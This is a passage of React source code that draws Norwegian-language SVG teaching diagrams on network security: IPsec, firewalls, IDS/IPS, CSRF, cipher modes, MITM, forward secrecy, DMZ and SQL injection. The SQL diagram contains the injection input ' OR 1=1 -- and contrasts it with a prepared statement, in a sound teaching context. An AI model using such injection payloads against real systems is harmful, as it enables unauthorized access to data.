      <text x={408} y={132} textAnchor="middle" className="fill-foreground text-[8px]">
        kryptert payload
      </text>
      <text x={408} y={146} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        (original IP+data)
      </text>
      <rect
        x={474}
        y={118}
        width={32}
        height={34}
        className="fill-success/30 stroke-success"
        strokeWidth={1}
      />
      <text x={490} y={138} textAnchor="middle" className="fill-foreground text-[8px]">
        MAC
      </text>

      <text x={360} y={180} textAnchor="middle" className="fill-foreground text-[10px]">
        Internett ser bare gateway-til-gateway
      </text>
      <text x={360} y={195} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Interne adresser og innhold skjult
      </text>

      <text x={20} y={220} className="fill-muted-foreground text-[9px]">
        Oslo GW 198.51.100.5
      </text>
      <text x={420} y={220} className="fill-muted-foreground text-[9px]">
        Bergen GW 203.0.113.9
      </text>

      <defs>
        <marker id="ip1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function FirewallRulesSvg() {
  const rules = [
    {
      n: 1,
      txt: "allow tcp any → web:443",
      color: "fill-success/20",
      stroke: "stroke-success",
      hit: false,
    },
    {
      n: 2,
      txt: "allow tcp any → mail:25",
      color: "fill-success/20",
      stroke: "stroke-success",
      hit: true,
    },
    {
      n: 3,
      txt: "allow established",
      color: "fill-success/20",
      stroke: "stroke-success",
      hit: false,
    },
    {
      n: 4,
      txt: "deny any → any",
      color: "fill-destructive/20",
      stroke: "stroke-destructive",
      hit: false,
    },
  ];
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Pakkefilter — top-down evaluering
      </text>

      <rect
        x={20}
        y={40}
        width={130}
        height={30}
        rx={4}
        className="fill-brand/30 stroke-brand"
        strokeWidth={1.5}
      />
      <text x={85} y={58} textAnchor="middle" className="fill-foreground text-[9px]">
        Innkommende pakke
      </text>
      <text x={85} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        TCP → mail.com:25
      </text>

      <line
        x1={150}
        y1={55}
        x2={200}
        y2={55}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        markerEnd="url(#fw)"
      />

      {rules.map((r, i) => (
        <g key={r.n}>
          <rect
            x={210}
            y={40 + i * 38}
            width={250}
            height={28}
            rx={3}
            className={`${r.color} ${r.stroke}`}
            strokeWidth={r.hit ? 2 : 1}
          />
          <text x={220} y={58 + i * 38} className="fill-foreground text-[9px] font-mono">
            #{r.n} {r.txt}
          </text>
          {r.hit && (
            <text x={475} y={58 + i * 38} className="fill-success text-[10px] font-semibold">
              ← MATCH
            </text>
          )}
        </g>
      ))}

      <text x={260} y={220} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Første match vinner. Regel 4 fanger alt som ikke ble eksplisitt tillatt.
      </text>

      <defs>
        <marker id="fw" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function IdsIpsSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        IDS (passiv) vs IPS (in-line)
      </text>

      {/* IDS row */}
      <text x={20} y={55} className="fill-brand text-[10px] uppercase tracking-wider font-semibold">
        IDS
      </text>
      <line x1={70} y1={80} x2={460} y2={80} className="stroke-foreground/60" strokeWidth={2} />
      <rect x={50} y={70} width={20} height={20} className="fill-amber-500" />
      <rect x={460} y={70} width={20} height={20} className="fill-success" />
      <text x={60} y={108} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        internett
      </text>
      <text x={470} y={108} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        intern
      </text>

      <rect
        x={235}
        y={62}
        width={50}
        height={36}
        rx={3}
        className="fill-card stroke-brand"
        strokeWidth={1.5}
        strokeDasharray="2 2"
      />
      <text x={260} y={84} textAnchor="middle" className="fill-foreground text-[9px]">
        switch
      </text>

      <line
        x1={260}
        y1={98}
        x2={260}
        y2={115}
        className="stroke-brand/60"
        strokeWidth={1}
        strokeDasharray="2 2"
      />
      <rect
        x={210}
        y={115}
        width={100}
        height={30}
        rx={4}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1.5}
      />
      <text x={260} y={132} textAnchor="middle" className="fill-foreground text-[9px]">
        IDS (sniffer)
      </text>
      <line
        x1={310}
        y1={130}
        x2={360}
        y2={130}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#id)"
      />
      <text x={395} y={134} className="fill-muted-foreground text-[8px]">
        varsel
      </text>

      <text x={195} y={158} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        SPAN-port kopierer trafikken
      </text>

      {/* IPS row */}
      <text
        x={20}
        y={185}
        className="fill-destructive text-[10px] uppercase tracking-wider font-semibold"
      >
        IPS
      </text>
      <line x1={70} y1={210} x2={235} y2={210} className="stroke-foreground/60" strokeWidth={2} />
      <line x1={285} y1={210} x2={460} y2={210} className="stroke-foreground/60" strokeWidth={2} />
      <rect x={50} y={200} width={20} height={20} className="fill-amber-500" />
      <rect x={460} y={200} width={20} height={20} className="fill-success" />

      <rect
        x={235}
        y={200}
        width={50}
        height={20}
        rx={3}
        className="fill-destructive/20 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={260} y={214} textAnchor="middle" className="fill-foreground text-[9px]">
        IPS
      </text>
      <text x={260} y={232} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        drop / pass
      </text>

      <defs>
        <marker id="id" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function CsrfSvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        CSRF — kryss-forespørsels-forfalskning
      </text>

      {/* Offer */}
      <rect
        x={20}
        y={40}
        width={90}
        height={50}
        rx={5}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1.5}
      />
      <text x={65} y={60} textAnchor="middle" className="fill-foreground text-[10px] font-semibold">
        offer
      </text>
      <text x={65} y={75} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        nettleser
      </text>
      <text x={65} y={86} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        cookie@bank
      </text>

      {/* Bank */}
      <rect
        x={410}
        y={40}
        width={90}
        height={50}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={455}
        y={60}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        bank.no
      </text>
      <text x={455} y={75} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        /overforing
      </text>

      <line
        x1={110}
        y1={60}
        x2={410}
        y2={60}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#cs)"
      />
      <text x={260} y={55} textAnchor="middle" className="fill-foreground text-[9px]">
        1. logger inn → får cookie
      </text>

      {/* Evil */}
      <rect
        x={210}
        y={130}
        width={100}
        height={40}
        rx={5}
        className="fill-destructive/20 stroke-destructive"
        strokeWidth={1.5}
      />
      <text
        x={260}
        y={148}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        evil.com
      </text>
      <text x={260} y={162} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        skjult POST-form
      </text>

      <line
        x1={65}
        y1={90}
        x2={215}
        y2={140}
        className="stroke-foreground/40"
        strokeWidth={1.2}
        markerEnd="url(#cs)"
      />
      <text x={130} y={120} className="fill-muted-foreground text-[8px]">
        2. besøker
      </text>

      <line
        x1={260}
        y1={170}
        x2={260}
        y2={195}
        className="stroke-destructive"
        strokeWidth={1.5}
        markerEnd="url(#cs)"
      />
      <text x={325} y={185} className="fill-foreground text-[9px]">
        3. siden POST-er til bank
      </text>

      <line
        x1={310}
        y1={210}
        x2={410}
        y2={85}
        className="stroke-destructive"
        strokeWidth={1.5}
        markerEnd="url(#cs)"
      />
      <text x={330} y={235} className="fill-destructive text-[9px]">
        + offerets cookie automatisk
      </text>

      <text x={260} y={252} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Forsvar: CSRF-token, SameSite-cookies, Origin-sjekk
      </text>

      <defs>
        <marker id="cs" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-current" />
        </marker>
      </defs>
    </svg>
  );
}

// ============================================================
// Nye SVG-er for metafor-pass
// ============================================================

function PassiveActiveSvg() {
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Passiv vs aktiv angriper
      </text>
      {/* Passive */}
      <text x={20} y={40} className="fill-brand text-[10px] uppercase tracking-wider font-semibold">
        Passiv
      </text>
      <circle cx={60} cy={75} r={12} className="fill-amber-500" />
      <text x={60} y={79} textAnchor="middle" className="fill-foreground text-[9px]">
        A
      </text>
      <circle cx={400} cy={75} r={12} className="fill-success" />
      <text x={400} y={79} textAnchor="middle" className="fill-foreground text-[9px]">
        B
      </text>
      <line x1={72} y1={75} x2={388} y2={75} className="stroke-foreground/50" strokeWidth={1.5} />
      <circle
        cx={230}
        cy={100}
        r={14}
        className="fill-muted/40 stroke-muted-foreground"
        strokeWidth={1}
        strokeDasharray="2 2"
      />
      <text x={230} y={104} textAnchor="middle" className="fill-foreground text-[9px]">
        T
      </text>
      <line
        x1={230}
        y1={86}
        x2={230}
        y2={76}
        className="stroke-muted-foreground/60"
        strokeWidth={1}
        strokeDasharray="2 2"
      />
      <text x={230} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        lytter bare — forsvar: kryptering
      </text>

      {/* Active */}
      <text
        x={20}
        y={160}
        className="fill-destructive text-[10px] uppercase tracking-wider font-semibold"
      >
        Aktiv
      </text>
      <circle cx={60} cy={185} r={12} className="fill-amber-500" />
      <text x={60} y={189} textAnchor="middle" className="fill-foreground text-[9px]">
        A
      </text>
      <circle cx={400} cy={185} r={12} className="fill-success" />
      <text x={400} y={189} textAnchor="middle" className="fill-foreground text-[9px]">
        B
      </text>
      <line x1={72} y1={185} x2={210} y2={185} className="stroke-foreground/50" strokeWidth={1.5} />
      <line
        x1={250}
        y1={185}
        x2={388}
        y2={185}
        className="stroke-foreground/50"
        strokeWidth={1.5}
      />
      <rect
        x={210}
        y={172}
        width={40}
        height={26}
        rx={3}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={230} y={189} textAnchor="middle" className="fill-foreground text-[9px]">
        T
      </text>
      <text x={460} y={189} className="fill-destructive text-[9px]">
        drop/endre
      </text>
    </svg>
  );
}

function EcbVsCbcSvg() {
  return (
    <svg viewBox="0 0 520 220" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        ECB lekker mønstre; CBC kjeder dem ut
      </text>
      {/* ECB row */}
      <text
        x={20}
        y={40}
        className="fill-destructive text-[10px] uppercase tracking-wider font-semibold"
      >
        ECB
      </text>
      <text x={20} y={60} className="fill-muted-foreground text-[8px]">
        klartekst
      </text>
      {["A", "A", "B", "A", "B", "B"].map((c, i) => (
        <g key={`ecbp-${i}`}>
          <rect
            x={70 + i * 30}
            y={50}
            width={26}
            height={20}
            className={c === "A" ? "fill-brand/40 stroke-brand" : "fill-success/40 stroke-success"}
            strokeWidth={1}
          />
          <text x={83 + i * 30} y={64} textAnchor="middle" className="fill-foreground text-[9px]">
            {c}
          </text>
        </g>
      ))}
      <text x={20} y={95} className="fill-muted-foreground text-[8px]">
        ciphertext
      </text>
      {["X", "X", "Y", "X", "Y", "Y"].map((c, i) => (
        <g key={`ecbc-${i}`}>
          <rect
            x={70 + i * 30}
            y={85}
            width={26}
            height={20}
            className={
              c === "X"
                ? "fill-amber-500/40 stroke-amber-500"
                : "fill-destructive/40 stroke-destructive"
            }
            strokeWidth={1}
          />
          <text x={83 + i * 30} y={99} textAnchor="middle" className="fill-foreground text-[9px]">
            {c}
          </text>
        </g>
      ))}
      <text x={280} y={120} className="fill-destructive text-[9px] italic">
        ← like A-blokker gir like X-er, mønster synlig
      </text>

      {/* CBC row */}
      <text
        x={20}
        y={150}
        className="fill-success text-[10px] uppercase tracking-wider font-semibold"
      >
        CBC
      </text>
      <text x={20} y={170} className="fill-muted-foreground text-[8px]">
        klartekst
      </text>
      {["A", "A", "B", "A", "B", "B"].map((c, i) => (
        <g key={`cbcp-${i}`}>
          <rect
            x={70 + i * 30}
            y={160}
            width={26}
            height={20}
            className={c === "A" ? "fill-brand/40 stroke-brand" : "fill-success/40 stroke-success"}
            strokeWidth={1}
          />
          <text x={83 + i * 30} y={174} textAnchor="middle" className="fill-foreground text-[9px]">
            {c}
          </text>
        </g>
      ))}
      <text x={20} y={205} className="fill-muted-foreground text-[8px]">
        ciphertext
      </text>
      {["q3", "f8", "k2", "p9", "z4", "m7"].map((c, i) => (
        <g key={`cbcc-${i}`}>
          <rect
            x={70 + i * 30}
            y={195}
            width={26}
            height={20}
            className="fill-muted/40 stroke-muted-foreground"
            strokeWidth={1}
          />
          <text
            x={83 + i * 30}
            y={209}
            textAnchor="middle"
            className="fill-foreground text-[8px] font-mono"
          >
            {c}
          </text>
        </g>
      ))}
    </svg>
  );
}

function HashMacSignSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Hash vs MAC vs Signering — hvem deler hva?
      </text>
      {[
        {
          y: 50,
          label: "Hash",
          who: "ingen hemmelighet",
          color: "fill-brand/30 stroke-brand",
          note: "kun mot tilfeldige feil",
        },
        {
          y: 110,
          label: "MAC",
          who: "A og B deler nøkkel K",
          color: "fill-amber-500/30 stroke-amber-500",
          note: "integritet + auth, ikke ikke-avvisning",
        },
        {
          y: 170,
          label: "Signering",
          who: "A har priv, alle har pub",
          color: "fill-success/30 stroke-success",
          note: "integritet + auth + ikke-avvisning",
        },
      ].map((row) => (
        <g key={row.label}>
          <rect
            x={20}
            y={row.y}
            width={90}
            height={50}
            rx={5}
            className={row.color}
            strokeWidth={1.5}
          />
          <text
            x={65}
            y={row.y + 22}
            textAnchor="middle"
            className="fill-foreground text-[11px] font-semibold"
          >
            {row.label}
          </text>
          <text
            x={65}
            y={row.y + 38}
            textAnchor="middle"
            className="fill-muted-foreground text-[8px]"
          >
            {row.who}
          </text>
          <text x={130} y={row.y + 28} className="fill-foreground text-[10px]">
            {row.note}
          </text>
        </g>
      ))}
      <text x={260} y={230} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Hash er gratis men svak; signering er dyrt men sterkest
      </text>
    </svg>
  );
}

function MitmSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Man-in-the-Middle — to parallelle handshakes
      </text>
      <circle cx={50} cy={120} r={18} className="fill-amber-500" />
      <text x={50} y={126} textAnchor="middle" className="fill-foreground text-[11px]">
        A
      </text>
      <circle cx={260} cy={120} r={20} className="fill-destructive" />
      <text x={260} y={126} textAnchor="middle" className="fill-foreground text-[11px]">
        T
      </text>
      <circle cx={470} cy={120} r={18} className="fill-success" />
      <text x={470} y={126} textAnchor="middle" className="fill-foreground text-[11px]">
        B
      </text>

      <line
        x1={70}
        y1={105}
        x2={240}
        y2={105}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#mm)"
      />
      <text x={155} y={100} textAnchor="middle" className="fill-foreground text-[9px]">
        handshake 1
      </text>
      <line
        x1={240}
        y1={135}
        x2={70}
        y2={135}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#mm)"
      />
      <text x={155} y={150} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        T later som B
      </text>

      <line
        x1={280}
        y1={105}
        x2={450}
        y2={105}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#mm)"
      />
      <text x={365} y={100} textAnchor="middle" className="fill-foreground text-[9px]">
        handshake 2
      </text>
      <line
        x1={450}
        y1={135}
        x2={280}
        y2={135}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#mm)"
      />
      <text x={365} y={150} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        T later som A
      </text>

      <defs>
        <marker id="mm" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-current" />
        </marker>
      </defs>

      <text x={260} y={195} textAnchor="middle" className="fill-foreground text-[10px]">
        Begge tror de snakker med rett part — alt går via T
      </text>
      <text x={260} y={215} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Forsvar: forhåndsdelt anker — sertifikat eller PSK binder identitet til nøkkel
      </text>
    </svg>
  );
}

function ForwardSecrecySvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Hva skjer når server-nøkkelen lekker?
      </text>

      {/* Left: RSA */}
      <text
        x={130}
        y={40}
        textAnchor="middle"
        className="fill-destructive text-[10px] uppercase tracking-wider font-semibold"
      >
        TLS 1.2 m/ RSA-KE
      </text>
      {[0, 1, 2, 3].map((i) => (
        <rect
          key={`l-${i}`}
          x={50 + i * 35}
          y={55}
          width={28}
          height={22}
          className="fill-brand/40 stroke-brand"
          strokeWidth={1}
        />
      ))}
      <text x={130} y={95} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        lagrede sesjoner
      </text>
      <line
        x1={50}
        y1={115}
        x2={210}
        y2={115}
        className="stroke-destructive"
        strokeWidth={1.5}
        strokeDasharray="3 2"
      />
      <text
        x={130}
        y={135}
        textAnchor="middle"
        className="fill-destructive text-[9px] font-semibold"
      >
        ⚠ alle dekrypteres
      </text>
      <text x={130} y={155} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        pre-master kryptert med
      </text>
      <text x={130} y={167} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        nå-lekket nøkkel
      </text>

      {/* Right: ECDHE */}
      <line x1={270} y1={30} x2={270} y2={230} className="stroke-border" strokeWidth={1} />
      <text
        x={400}
        y={40}
        textAnchor="middle"
        className="fill-success text-[10px] uppercase tracking-wider font-semibold"
      >
        TLS 1.3 m/ ECDHE
      </text>
      {[0, 1, 2, 3].map((i) => (
        <rect
          key={`r-${i}`}
          x={320 + i * 35}
          y={55}
          width={28}
          height={22}
          className="fill-success/40 stroke-success"
          strokeWidth={1}
        />
      ))}
      <text x={400} y={95} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        lagrede sesjoner
      </text>
      <line x1={320} y1={115} x2={480} y2={115} className="stroke-success" strokeWidth={1.5} />
      <text x={400} y={135} textAnchor="middle" className="fill-success text-[9px] font-semibold">
        ✓ trygge
      </text>
      <text x={400} y={155} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        ephemeral DH-nøkkel
      </text>
      <text x={400} y={167} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        slettet etter handshake
      </text>

      <text x={260} y={210} textAnchor="middle" className="fill-foreground text-[10px]">
        Server-nøkkel lekker
      </text>
      <text x={260} y={230} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Forward Secrecy beskytter fortiden — ikke fremtiden
      </text>
    </svg>
  );
}

function TransportVsTunnelSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Transport-mode vs Tunnel-mode (ESP)
      </text>

      {/* Transport */}
      <text x={20} y={45} className="fill-brand text-[10px] uppercase tracking-wider font-semibold">
        Transport
      </text>
      <rect
        x={70}
        y={55}
        width={70}
        height={28}
        className="fill-amber-500/30 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={105} y={73} textAnchor="middle" className="fill-foreground text-[9px]">
        IP-hdr
      </text>
      <rect
        x={140}
        y={55}
        width={50}
        height={28}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1}
      />
      <text x={165} y={73} textAnchor="middle" className="fill-foreground text-[8px]">
        ESP-hdr
      </text>
      <rect
        x={190}
        y={55}
        width={170}
        height={28}
        className="fill-brand/40 stroke-brand"
        strokeWidth={1}
      />
      <text x={275} y={73} textAnchor="middle" className="fill-foreground text-[9px]">
        kryptert TCP+data
      </text>
      <rect
        x={360}
        y={55}
        width={35}
        height={28}
        className="fill-success/30 stroke-success"
        strokeWidth={1}
      />
      <text x={377} y={73} textAnchor="middle" className="fill-foreground text-[8px]">
        MAC
      </text>
      <text x={70} y={105} className="fill-muted-foreground text-[8px] italic">
        original IP-header beholdes — host-til-host
      </text>

      {/* Tunnel */}
      <text
        x={20}
        y={145}
        className="fill-success text-[10px] uppercase tracking-wider font-semibold"
      >
        Tunnel
      </text>
      <rect
        x={50}
        y={155}
        width={70}
        height={28}
        className="fill-amber-500/30 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={85} y={173} textAnchor="middle" className="fill-foreground text-[9px]">
        ny IP-hdr
      </text>
      <rect
        x={120}
        y={155}
        width={50}
        height={28}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1}
      />
      <text x={145} y={173} textAnchor="middle" className="fill-foreground text-[8px]">
        ESP-hdr
      </text>
      <rect
        x={170}
        y={155}
        width={235}
        height={28}
        className="fill-brand/40 stroke-brand"
        strokeWidth={1}
      />
      <text x={287} y={173} textAnchor="middle" className="fill-foreground text-[9px]">
        kryptert (gammel IP + TCP + data)
      </text>
      <rect
        x={405}
        y={155}
        width={35}
        height={28}
        className="fill-success/30 stroke-success"
        strokeWidth={1}
      />
      <text x={422} y={173} textAnchor="middle" className="fill-foreground text-[8px]">
        MAC
      </text>
      <text x={50} y={205} className="fill-muted-foreground text-[8px] italic">
        hele original-pakken pakkes inn — gateway-til-gateway, interne adresser skjult
      </text>
    </svg>
  );
}

function DmzSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        DMZ-topologi
      </text>

      <rect
        x={20}
        y={70}
        width={70}
        height={50}
        rx={5}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1.5}
      />
      <text x={55} y={90} textAnchor="middle" className="fill-foreground text-[10px]">
        Internett
      </text>
      <text x={55} y={105} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        ukjent
      </text>

      <rect
        x={110}
        y={75}
        width={20}
        height={40}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={120} y={130} textAnchor="middle" className="fill-foreground text-[8px]">
        FW1
      </text>

      <rect
        x={150}
        y={50}
        width={180}
        height={90}
        rx={6}
        className="fill-card stroke-brand/60"
        strokeWidth={1.5}
        strokeDasharray="4 3"
      />
      <text
        x={240}
        y={72}
        textAnchor="middle"
        className="fill-brand text-[10px] uppercase tracking-wider font-semibold"
      >
        DMZ
      </text>
      <rect
        x={165}
        y={85}
        width={60}
        height={22}
        rx={3}
        className="fill-brand/30 stroke-brand"
        strokeWidth={1}
      />
      <text x={195} y={100} textAnchor="middle" className="fill-foreground text-[9px]">
        web
      </text>
      <rect
        x={245}
        y={85}
        width={60}
        height={22}
        rx={3}
        className="fill-brand/30 stroke-brand"
        strokeWidth={1}
      />
      <text x={275} y={100} textAnchor="middle" className="fill-foreground text-[9px]">
        mail
      </text>
      <rect
        x={205}
        y={115}
        width={60}
        height={22}
        rx={3}
        className="fill-brand/30 stroke-brand"
        strokeWidth={1}
      />
      <text x={235} y={130} textAnchor="middle" className="fill-foreground text-[9px]">
        DNS
      </text>

      <rect
        x={350}
        y={75}
        width={20}
        height={40}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={360} y={130} textAnchor="middle" className="fill-foreground text-[8px]">
        FW2
      </text>

      <rect
        x={390}
        y={70}
        width={110}
        height={50}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text x={445} y={90} textAnchor="middle" className="fill-foreground text-[10px]">
        Intern LAN
      </text>
      <text x={445} y={105} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        database, ansatte
      </text>

      <text x={260} y={175} textAnchor="middle" className="fill-foreground text-[10px]">
        Brann-mur 1: slipper inn på 80/443/25 → DMZ
      </text>
      <text x={260} y={195} textAnchor="middle" className="fill-foreground text-[10px]">
        Brann-mur 2: slipper INGEN inn fra DMZ → LAN
      </text>
      <text x={260} y={220} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Hvis DMZ kompromitteres, må angriper bryte FW2 også
      </text>
    </svg>
  );
}

function BayesFellaSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Bayes-fellen: presisjon faller når angrep er sjeldne
      </text>

      {/* Confusion matrix */}
      <rect
        x={150}
        y={50}
        width={120}
        height={70}
        className="fill-success/30 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={210}
        y={80}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        99
      </text>
      <text x={210} y={100} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        TP (ekte angrep)
      </text>

      <rect
        x={270}
        y={50}
        width={120}
        height={70}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1.5}
      />
      <text
        x={330}
        y={80}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        5000
      </text>
      <text x={330} y={100} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        FP (falsk alarm)
      </text>

      <rect
        x={150}
        y={120}
        width={120}
        height={50}
        className="fill-destructive/15 stroke-destructive/60"
        strokeWidth={1}
      />
      <text x={210} y={140} textAnchor="middle" className="fill-foreground text-[10px]">
        1
      </text>
      <text x={210} y={155} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        FN (mistet angrep)
      </text>

      <rect
        x={270}
        y={120}
        width={120}
        height={50}
        className="fill-muted/20 stroke-muted-foreground/40"
        strokeWidth={1}
      />
      <text x={330} y={140} textAnchor="middle" className="fill-foreground text-[10px]">
        ~10M
      </text>
      <text x={330} y={155} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        TN
      </text>

      <text x={210} y={45} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        alarm
      </text>
      <text x={330} y={45} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        ingen alarm
      </text>
      <text x={130} y={87} textAnchor="end" className="fill-muted-foreground text-[9px]">
        ekte
      </text>
      <text x={130} y={150} textAnchor="end" className="fill-muted-foreground text-[9px]">
        ingen
      </text>

      <text x={260} y={195} textAnchor="middle" className="fill-foreground text-[10px]">
        Presisjon = 99 / (99 + 5000) ≈ <tspan className="fill-destructive font-semibold">2 %</tspan>
      </text>
      <text x={260} y={215} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Selv en god detektor drukner i støy når basisraten er liten
      </text>
    </svg>
  );
}

function SqliSvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        SQL: konkatenering vs prepared statement
      </text>

      {/* Vulnerable */}
      <text
        x={20}
        y={45}
        className="fill-destructive text-[10px] uppercase tracking-wider font-semibold"
      >
        Sårbart
      </text>
      <rect
        x={20}
        y={55}
        width={480}
        height={30}
        rx={3}
        className="fill-destructive/10 stroke-destructive"
        strokeWidth={1}
      />
      <text x={30} y={75} className="fill-foreground text-[10px] font-mono">
        "SELECT * FROM u WHERE name='" + input + "'"
      </text>
      <text x={20} y={100} className="fill-muted-foreground text-[9px]">
        input:
      </text>
      <rect
        x={70}
        y={88}
        width={150}
        height={20}
        rx={3}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={75} y={103} className="fill-foreground text-[10px] font-mono">
        ' OR 1=1 --
      </text>
      <text x={230} y={103} className="fill-destructive text-[10px]">
        → tolket som SQL-syntaks!
      </text>

      <line
        x1={260}
        y1={115}
        x2={260}
        y2={140}
        className="stroke-destructive"
        strokeWidth={1.5}
        markerEnd="url(#sqi)"
      />

      <rect
        x={70}
        y={140}
        width={380}
        height={28}
        rx={3}
        className="fill-destructive/20 stroke-destructive"
        strokeWidth={1}
      />
      <text x={260} y={158} textAnchor="middle" className="fill-foreground text-[10px] font-mono">
        SELECT * FROM u WHERE name='' OR 1=1 --'
      </text>

      {/* Safe */}
      <text
        x={20}
        y={195}
        className="fill-success text-[10px] uppercase tracking-wider font-semibold"
      >
        Trygt — prepared statement
      </text>
      <rect
        x={20}
        y={205}
        width={290}
        height={30}
        rx={3}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={30} y={225} className="fill-foreground text-[10px] font-mono">
        "SELECT * FROM u WHERE name=?"
      </text>
      <rect
        x={320}
        y={205}
        width={140}
        height={30}
        rx={3}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={330} y={225} className="fill-foreground text-[10px] font-mono">
        bind: ' OR 1=1 --
      </text>
